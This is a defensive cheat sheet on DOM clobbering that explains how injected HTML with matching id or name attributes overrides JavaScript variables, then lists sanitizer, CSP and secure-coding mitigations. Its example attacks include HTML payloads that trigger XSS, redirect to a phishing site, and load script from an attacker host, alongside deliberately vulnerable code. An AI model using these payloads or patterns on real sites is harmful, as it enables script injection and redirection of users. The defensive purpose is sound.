# DOM Clobbering Prevention Cheat Sheet

## Introduction

DOM Clobbering = code-reuse, HTML-only injection attack: attacker injects HTML elements whose `id` or `name` attribute matches name of security-sensitive variables or browser APIs (e.g., variables used to fetch remote content such as script src), overshadowing their value.

Relevant when script injection impossible (filtered by HTML sanitizers, or script execution disallowed/controlled). Attacker still injects non-script HTML markup, turning initially secure markup into executable code → [Cross-Site Scripting (XSS)](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html).

**Guidelines, secure coding patterns, practices to prevent/restrict DOM Clobbering impact.**

## Background

Browser builds DOM tree on page load; JavaScript has read/write access.

While building DOM tree, browsers also create attribute for (some) named HTML elements on `window` and `document`. Named elements = those w/ `id` or `name` attribute. Example markup:

```html
<form id=x name=x></form>
```

creates named references to form on `window` and `document`. `name` attribute needed for named access on `document`; form's `id` alone doesn't provide that reference:

```js
var obj1 = document.getElementById('x');
var obj2 = document.x;
var obj3 = document.x;
var obj4 = window.x;
var obj5 = x; // by default, objects belong to the global Window, so x is same as window.x
console.log(
 obj1 === obj2 && obj2 === obj3 &&
 obj3 === obj4 && obj4 === obj5
); // true
```

Accessing `window`/`document` attribute: named HTML element references come before lookups of built-in APIs and developer-defined attributes (named property accesses). Developers unaware may use window/document attribute content for sensitive operations (e.g., URLs for fetching remote content); attacker injects markup w/ colliding names. Built-in browser APIs can be overshadowed too.

Attacker able to inject (non-script) HTML markup can change value of variable app relies on via named property accesses → malfunction, sensitive data exposure, attacker-controlled script execution. Exploits (legacy) behavior: namespace collision between execution environment (`window`, `document`) and JavaScript code.

### Example Attack 1

```javascript
let redirectTo = window.redirectTo || '/profile/';
location.assign(redirectTo);
```

Attacker can:

- inject `<a id=redirectTo href='javascript:alert(1)'></a>` → XSS.
- inject `<a id=redirectTo href='https://phishing.example/'></a>` → open redirect.

### Example Attack 2

```javascript
var script = document.createElement('script');
let src = window.config.url || 'script.js';
script.src = src;
document.body.appendChild(script);
```

Attacker injects `<a id=config></a><a id=config name=url href='https://attacker.example/payload.js'></a>` → loads additional JavaScript → arbitrary client-side code execution.

## Summary of Guidelines

Quick reference:

|    | **Guidelines**                                                | Description                                                               |
|----|---------------------------------------------------------------|---------------------------------------------------------------------------|
| \# 1  | Use HTML Sanitizers                                           | [link](#1-html-sanitization)                                              |
| \# 2  | Use Content-Security Policy                                   | [link](#2-content-security-policy)                                        |
| \# 3  | Freeze Application Configuration Objects                                  | [link](#3-freezing-application-configuration-objects)                                 |
| \# 4  | Validate All Inputs to DOM Tree                               | [link](#4-validate-all-inputs-to-dom-tree)                                |
| \# 5  | Use Explicit Variable Declarations                            | [link](#5-use-explicit-variable-declarations)                             |
| \# 6  | Do Not Use Document and Window for Global Variables           | [link](#6-do-not-use-document-and-window-for-global-variables)            |
| \# 7  | Do Not Trust Document Built-in APIs Before Validation         | [link](#7-do-not-trust-document-built-in-apis-before-validation)          |
| \# 8  | Enforce Type Checking                                         | [link](#8-enforce-type-checking)                                          |
| \# 9  | Use Strict Mode                                               | [link](#9-use-strict-mode)                                                |
| \# 10 | Apply Browser Feature Detection                               | [link](#10-apply-browser-feature-detection)                               |
| \# 11 | Limit Variables to Local Scope                                | [link](#11-limit-variables-to-local-scope)                                |
| \# 12 | Use Unique Variable Names In Production                       | [link](#12-use-unique-variable-names-in-production)                       |
| \# 13 | Use Object-oriented Programming Techniques like Encapsulation | [link](#13-use-object-oriented-programming-techniques-like-encapsulation) |

## Mitigation Techniques

### \#1: HTML Sanitization

Robust HTML sanitizers prevent/restrict DOM Clobbering risk. Ways:

- Remove named properties like `id` and `name` entirely. Effective, but may hinder legitimate functionality needing them.
- Namespace isolation, e.g., prefix named property values w/ constant string to limit naming collisions.
- Dynamically check whether input markup's named properties collide w/ existing DOM tree; if so, remove them from input markup.

OWASP recommends DOMPurify or Sanitizer API for HTML sanitization.

#### DOMPurify Sanitizer

By default DOMPurify removes all clobbering collisions w/ **built-in** APIs/properties (enabled-by-default `SANITIZE_DOM` option).

To also protect custom variables/properties, enable `SANITIZE_NAMED_PROPS`:

```js
var clean = DOMPurify.sanitize(dirty, {SANITIZE_NAMED_PROPS: true});
```

Isolates namespace of named properties vs JavaScript variables by prefixing w/ `user-content-`.

#### Sanitizer API

Use browser Sanitizer API only where required methods supported. Start from default configuration; explicitly disallow `id` and `name` via [`removeAttribute()`](https://developer.mozilla.org/en-US/docs/Web/API/Sanitizer/removeAttribute) (removes attribute from all elements):

```js
const sanitizerInstance = new Sanitizer();
sanitizerInstance.removeAttribute('id');
sanitizerInstance.removeAttribute('name');
containerDOMElement.setHTML(input, {sanitizer: sanitizerInstance});
```

Example assumes app needs no `id`/`name` attributes in untrusted markup. Unsupported browsers: use DOMPurify configuration above; never fall back to inserting unsanitized HTML.

### \#2: Content-Security Policy

Content-Security Policy (CSP) = rules telling browser which resources may load on page. Restricting JavaScript sources (e.g., script-src directive) prevents malicious code injection.

**Note:** CSP mitigates only **some variants** of DOM clobbering, e.g., attacker loading new scripts by clobbering script sources; not when already-present code is abusable for code execution, e.g., clobbering parameters of code evaluation constructs like `eval()`.

### \#3: Freezing Application Configuration Objects

Use Object.freeze() only as additional control for app-owned configuration objects initialized w/ trusted values and retained in local scope. Prevents replacement of own data properties but is shallow: nested objects and getter return values can still change.

Don't rely on freezing `window`, `document`, or DOM elements to prevent named-property clobbering. E.g., `window` rejects attempts to prevent extensions, so `Object.freeze(window)` throws. Use [HTML sanitization](#1-html-sanitization) + [local variables](#11-limit-variables-to-local-scope) to avoid attacker-controlled named-property lookups.

## Secure Coding Guidelines

Avoid DOM Clobbering via defensive programming + coding patterns below.

### \#4: Validate All Inputs to DOM Tree

Before inserting any markup into DOM tree, sanitize `id` and `name` attributes (see [HTML sanitization](#1-html-sanitization)).

### \#5: Use Explicit Variable Declarations

Always initialize variables w/ declarator `var`, `let` or `const`; prevents clobbering of variable.

**Note:** `let` declaration creates no property on `window` (unlike `var`). So `window.VARNAME` can still be clobbered (assuming `VARNAME` is variable name).

### \#6: Do Not Use Document and Window for Global Variables

Don't store global variables in `document`/`window`; easily manipulated.

### \#7: Do Not Trust Document Built-in APIs Before Validation

Document properties, incl. built-in, always overshadowed by DOM Clobbering, even right after assignment.

**Hint:** Cause: named property visibility algorithm; named HTML element references precede lookups of built-in APIs and other `document` attributes.

### \#8: Enforce Type Checking

Always check type of `document`/`window` properties before sensitive operations, e.g., [`instanceof`](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Operators/instanceof).

**Hint:** Clobbered object refers to [`Element`](https://developer.mozilla.org/en-US/docs/Web/API/Element) instance, likely unexpected type.

### \#9: Use Strict Mode

Use `strict` mode: prevents unintended global variable creation, and raises error on overwriting read-only properties.

### \#10: Apply Browser Feature Detection

Use feature detection, not browser-specific features/properties, to check support before use. Prevents errors + DOM Clobbering from unsupported-browser use.

**Hint:** Unsupported feature APIs act as undefined variable/property in unsupported browsers → clobberable.

### \#11: Limit Variables to Local Scope

Global variables more prone to DOM Clobbering overwrite. Use local variables + object properties whenever possible.

### \#12: Use Unique Variable Names In Production

Unique variable names help prevent naming collisions causing accidental overwrites.

### \#13: Use Object-oriented Programming Techniques like Encapsulation

Encapsulate variables/functions in objects/classes to prevent overwrite. Private members inaccessible from outside object → less prone to DOM Clobbering.

## References

- WHATWG HTML: Named Access on the Window Object
- DOMPurify Documentation
- WHATWG Web IDL: Legacy Platform Object Abstract Operations
